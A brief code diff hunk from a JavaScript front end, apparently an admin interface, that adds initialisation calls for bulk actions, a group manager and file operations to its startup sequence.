@@ -1298,8 +1800,11 @@
   // ------------------------------------------------------------------
   wireToolbar();
   wireGrid();
+  wireBulk();
   wireModal();
   wireClientEditor();
+  wireGroupManager();
+  wireFileOps();
   wireSysProcs();
   quickButtons();
   loadState();
